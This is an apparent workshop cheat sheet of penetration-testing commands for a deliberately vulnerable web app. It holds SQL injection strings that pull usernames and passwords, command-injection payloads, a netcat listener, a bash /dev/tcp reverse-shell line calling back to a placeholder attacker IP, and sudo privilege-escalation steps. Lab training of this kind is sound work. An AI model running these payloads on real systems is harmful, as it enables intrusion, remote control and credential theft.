# Commands Cheatsheet for Vulnerable Web Workshop

## General Commands
- **Navigate to a directory**: `cd <directory_name>`
- **List files in a directory**: `ls -la`
- **View file contents**: `cat <file_name>`
- **Edit a file**: `nano <file_name>` or `vim <file_name>`

## Reconnaissance
- **Check open ports**: `nmap -sS -p- <target_ip>`
- **Get service versions**: `nmap -sV <target_ip>`

## SQL Injection
- **Basic SQL injection test**: `"' OR '1'='1`
- **Union-based injection**: `"' UNION SELECT null, username, password FROM users -- `
  
## Command Injection
- **Execute a command**: `; <command> #`
- **Check for command execution**: `curl <your_api_endpoint>?input=;ls`

## File Upload Vulnerabilities
- **Upload a reverse shell**: Use a PHP or Node.js reverse shell script.
- **Check uploaded files**: `ls /path/to/uploads`

## Reverse Shell
- **Set up a listener**: `nc -lvnp <port>`
- **Connect back from the target**: `bash -i >& /dev/tcp/<your_ip>/<port> 0>&1`

## Privilege Escalation on Ubuntu
- **Check sudo permissions**: `sudo -l`
- **Edit sudoers file**: `sudo visudo`
- **Exploit vulnerable binaries**: `sudo <vulnerable_binary>`

## Miscellaneous
- **Check current user**: `whoami`
- **Check environment variables**: `env`
- **View running processes**: `ps aux`

## Important Notes
- Always ensure you have permission to test and exploit vulnerabilities.
- Use these commands responsibly and ethically in a controlled environment.